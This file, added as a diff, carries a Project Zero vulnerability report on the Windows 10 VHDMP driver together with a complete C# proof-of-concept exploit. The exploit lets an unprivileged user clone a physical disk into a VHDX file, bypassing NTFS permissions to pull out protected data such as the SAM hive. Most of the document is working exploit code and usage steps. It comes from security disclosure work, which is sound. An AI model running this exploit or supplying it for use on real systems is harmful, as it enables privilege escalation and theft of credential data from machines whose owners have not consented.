@@ -1,0 +1,257 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=916
+
+Windows: VHDMP Arbitrary Physical Disk Cloning EoP
+Platform: Windows 10 10586. No idea about 14393, 7 or 8.1 versions.
+Class: Elevation of Privilege
+
+Summary:
+The VHDMP driver doesn’t open physical disk drives securely when creating a new VHD leading to information disclosure and EoP by allowing a user to access data they’re shouldn’t have access to.
+
+Description:
+
+The VHDMP driver is used to mount VHD and ISO files so that they can be accessed as a normal mounted volume. When creating a new VHD it’s possible to specify a physical drive to clone from, you’d assume that this feature would be limited to only administrators as accessing a physical disk for read access is limited to administrators group and system. However when calling VhdmpiTryOpenPhysicalDisk the driver uses ZwOpenFile and doesn’t specify the OBJ_FORCE_ACCESS_CHECK flag. As no other administrator checks are done this means that a normal user can clone the physical disk to another file which they can read, to bypass DACL checks on NTFS and extract data such as the SAM hive. 
+
+Proof of Concept:
+
+I’ve provided a PoC as a C# source code file. You need to compile with .NET 4 or higher. It will create a new VHDX from a specified physical drive. Note as this is a physical clone it’ll presumably not bypass Bitlocker, but that’s not likely to be a major issue in a lot of cases.
+
+1) Compile the C# source code file.
+2) Execute the poc on Win 10 passing the path to the vhd file to create and the physical drive index of the drive to clone. If you run without arguments it’ll print which drives are available. You probably want to clone one drive to another otherwise you’d likely run out of space (and of course have enough space). It also should work to copy the vhd out to a network share.
+3) It should print that it created the clone of the drive. If you now mount that VHD somewhere else it should contain the original file systems of the original disk.
+
+Expected Result:
+The VHD creation fails with access denied.
+
+Observed Result:
+The physical disk is cloned successfully.
+*/
+
+using Microsoft.Win32.SafeHandles;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Runtime.InteropServices;
+using System.Linq;
+
+namespace Poc
+{
+    class Program
+    {
+        enum StorageDeviceType
+        {
+            Unknown = 0,
+            Iso = 1,
+            Vhd = 2,
+            Vhdx = 3,
+            VhdSet = 4,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct VirtualStorageType
+        {
+            public StorageDeviceType DeviceId;
+            public Guid VendorId;
+        }
+
+        enum OpenVirtualDiskFlag
+        {
+            None = 0,
+            NoParents = 1,
+            BlankFile = 2,
+            BootDrive = 4,
+            CachedIo = 8,
+            DiffChain = 0x10,
+            ParentcachedIo = 0x20,
+            VhdSetFileOnly = 0x40,
+        }
+
+        enum CreateVirtualDiskVersion
+        {
+            Unspecified = 0,
+            Version1 = 1,
+            Version2 = 2,
+            Version3 = 3,
+        }
+            
+        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+        struct CreateVirtualDiskParameters
+        {            
+            public CreateVirtualDiskVersion Version;
+            public Guid UniqueId;
+            public ulong MaximumSize;
+            public uint BlockSizeInBytes;
+            public uint SectorSizeInBytes;            
+            [MarshalAs(UnmanagedType.LPWStr)]
+            public string ParentPath;
+            [MarshalAs(UnmanagedType.LPWStr)]
+            public string SourcePath;            
+        }
+
+        enum VirtualDiskAccessMask
+        {
+            None = 0,
+            AttachRo = 0x00010000,
+            AttachRw = 0x00020000,
+            Detach = 0x00040000,
+            GetInfo = 0x00080000,
+            Create = 0x00100000,
+            MetaOps = 0x00200000,
+            Read = 0x000d0000,
+            All = 0x003f0000
+        }
+
+        enum CreateVirtualDiskFlag
+        {
+            None = 0x0,
+            FullPhysicalAllocation = 0x1,
+            PreventWritesToSourceDisk = 0x2,
+            DoNotcopyMetadataFromParent = 0x4,
+            CreateBackingStorage = 0x8,
+            UseChangeTrackingSourceLimit = 0x10,
+            PreserveParentChangeTrackingState = 0x20,
+        }        
+
+        [DllImport("virtdisk.dll", CharSet=CharSet.Unicode)]
+        static extern int CreateVirtualDisk(
+            [In] ref VirtualStorageType VirtualStorageType,
+            string Path,
+            VirtualDiskAccessMask        VirtualDiskAccessMask,
+            [In] byte[] SecurityDescriptor,
+            CreateVirtualDiskFlag        Flags,
+            uint ProviderSpecificFlags,
+            [In] ref CreateVirtualDiskParameters Parameters,
+            IntPtr  Overlapped,
+            out IntPtr Handle
+        );
+
+        static Guid GUID_DEVINTERFACE_SURFACE_VIRTUAL_DRIVE = new Guid("2E34D650-5819-42CA-84AE-D30803BAE505");
+        static Guid VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT = new Guid("EC984AEC-A0F9-47E9-901F-71415A66345B");
+
+        class PhysicalDisk
+        {
+            public uint Index { get; private set; }
+            public string Name { get; private set; }
+            public uint SectorSizeInBytes { get; private set; }
+            public ulong SizeInBytes { get; private set; }            
+            public string Model { get; private set; }
+
+            public PhysicalDisk(ManagementObject wmi_object)
+            {
+                Index = (uint)wmi_object["Index"];
+                Name = (string)wmi_object["DeviceId"];
+                SectorSizeInBytes = (uint)wmi_object["BytesPerSector"];
+                SizeInBytes = (ulong)wmi_object["Size"];                
+                Model = (string)wmi_object["Model"];
+            }
+
+            static string FormatHuman(ulong l)
+            {
+                if (l < 1000 * 1000)
+                    return l.ToString();
+
+                l = l / (1000 * 1000);
+                if (l < 1000)
+                    return String.Format("{0}MB", l);
+
+                l = l / (1000);
+                if (l < 1000)
+                    return String.Format("{0}GB", l);
+
+                l = l / (1000);
+                if (l < 1000)
+                    return String.Format("{0}TB", l);
+
+                return l.ToString();
+            }
+
+            public override string ToString()
+            {
+                return String.Format("{0}: Name={1}, Model={2}, Size={3}", Index, Name, Model, FormatHuman(SizeInBytes));
+            }
+
+            public static IEnumerable<PhysicalDisk> GetDisks()
+            {
+                SelectQuery selectQuery = new SelectQuery("Win32_DiskDrive");
+                ManagementObjectSearcher searcher =
+                    new ManagementObjectSearcher(selectQuery);
+                foreach (ManagementObject disk in searcher.Get())
+                {
+                    yield return new PhysicalDisk(disk);
+                }
+            }
+        }
+
+        static PhysicalDisk GetPhysicalDisk(uint index)
+        {
+            PhysicalDisk disk = PhysicalDisk.GetDisks().First(d => d.Index == index);
+
+            if (disk == null)
+                throw new InvalidOperationException(String.Format("Can't find physical disk index {0}", index));
+
+            return disk;
+        }
+
+        static void PrintPhysicalDisks()
+        {
+            foreach (PhysicalDisk disk in PhysicalDisk.GetDisks())
+            {
+                Console.WriteLine(disk);
+            }            
+        }
+
+        static SafeFileHandle CreateVHD(string path, PhysicalDisk disk)
+        {
+            VirtualStorageType vhd_type = new VirtualStorageType();
+            vhd_type.DeviceId = StorageDeviceType.Vhdx;
+            vhd_type.VendorId = VIRTUAL_STORAGE_TYPE_VENDOR_MICROSOFT;
+
+            CreateVirtualDiskParameters ps = new CreateVirtualDiskParameters();
+            ps.Version = CreateVirtualDiskVersion.Version1;
+            ps.SectorSizeInBytes = disk.SectorSizeInBytes;
+            ps.MaximumSize = disk.SizeInBytes + (100 * 1024 * 1024);
+            ps.SourcePath = disk.Name;
+            IntPtr hDisk;
+            int error = CreateVirtualDisk(ref vhd_type, path, VirtualDiskAccessMask.All, null, CreateVirtualDiskFlag.None, 0, ref ps, IntPtr.Zero, out hDisk);
+            if (error != 0)
+            {
+                throw new Win32Exception(error);
+            }
+
+            return new SafeFileHandle(hDisk, true);
+        }        
+        
+        static void Main(string[] args)
+        {
+            try
+            {                
+                if (args.Length < 2)
+                {
+                    Console.WriteLine(@"[USAGE]: poc output.vhdx driveno");
+                    Console.WriteLine("Where driveno is one of the following indexes");
+                    PrintPhysicalDisks();
+                    Environment.Exit(1);
+                }
+                
+                string vhd_path = Path.GetFullPath(args[0]);
+                vhd_path = Path.ChangeExtension(vhd_path, ".vhdx");
+                File.Delete(vhd_path);
+                PhysicalDisk disk = GetPhysicalDisk(uint.Parse(args[1]));
+                                
+                Console.WriteLine("[INFO]: Creating VHD {0} from {1}", vhd_path, disk.Name);
+                
+                using (SafeFileHandle handle = CreateVHD(vhd_path, disk))
+                {
+                    Console.WriteLine("[SUCCESS]: Created clone of physical disk");
+                }                
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[ERROR]: {0}", ex.Message);
+            }
+        }
+    }
+}
